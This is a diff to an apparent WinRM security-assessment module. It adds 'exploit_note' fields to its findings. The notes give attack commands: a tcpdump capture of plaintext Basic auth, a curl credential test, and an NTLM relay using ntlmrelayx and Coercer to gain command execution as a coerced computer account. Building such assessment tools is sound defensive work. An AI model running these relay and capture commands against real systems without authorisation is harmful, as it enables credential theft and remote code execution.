@@ -251,10 +251,12 @@ def winrm_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": tool, "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -302,7 +304,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "wsman with a marker password and capture the request",
                     "Turn Basic off (Set-Item WSMan:\\localhost\\Service\\Auth\\"
                     "Basic $false); require HTTPS listener on 5986 only.",
-                    ["CWE-319", "CWE-522"], kind="winrm_basic_plaintext"))
+                    ["CWE-319", "CWE-522"], kind="winrm_basic_plaintext",
+                    exploit_note=(
+                        "tcpdump -i <iface> -w winrm.pcap 'tcp port 5985' & then "
+                        "wait for real auth; or curl -kv -u USER:PASS "
+                        "http://<ip>:5985/wsman -H 'Content-Type: "
+                        "application/soap+xml' -d '<Identify/>' and confirm 200."),
+                    depth_tier="t1"))
             elif "Basic" in auth:
                 out.append(_finding(
                     "low",
@@ -376,7 +384,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Protection for Authentication (Service\\CbtHardeningLevel="
                     "Strict) so the NTLM MIC is bound to the TLS channel; "
                     "restrict WinRM to management networks.",
-                    ["CWE-294", "CWE-522"], kind="winrm_relay_target"))
+                    ["CWE-294", "CWE-522"], kind="winrm_relay_target",
+                    exploit_note=(
+                        "impacket-ntlmrelayx.py -t http://<ip>:5985/wsman "
+                        "-smb2support -c 'whoami /all' & then Coercer coerce "
+                        "-u <lp> -p <lpass> -t <victim> -l <you>. Successful "
+                        "relay = command exec as coerced computer account."),
+                    depth_tier="t1"))
 
             if "CredSSP" in auth:
                 out.append(_finding(
